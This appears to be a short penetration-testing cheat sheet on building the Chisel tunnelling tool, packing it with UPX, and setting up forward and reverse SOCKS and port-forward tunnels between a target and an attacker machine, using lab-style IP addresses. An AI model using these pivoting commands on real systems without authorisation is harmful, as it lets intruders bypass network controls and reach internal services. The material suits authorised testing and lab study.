git clone https://github.com/jpillora/chisel.git  
# Building Chisel

```
cd chisel  
go build
```
  
OPTIONAL REDUCE SIZE OF BINARY 

```
go build -ldflags="-s -w"  
upx chisel  
```
  
# Forward Tunnel
>[!NOTE] ON TARGET  

```
./chisel server -v -p $PORT --socks5  
```
  
>[!NOTE] RUN ON ATTACKER

```
./chisel client -v $IP:$PORT socks  
```
  
# Reverse Tunnel 

>[!NOTE] ON ATTACKER  

```
./chisel server --reverse --port 443  
```
  
>[!NOTE] On Target

```
.\Chisel.exe client 10.10.14.226:80 R:9200:localhost:9200  
./chisel client 192.168.118.4:8080 R:socks
```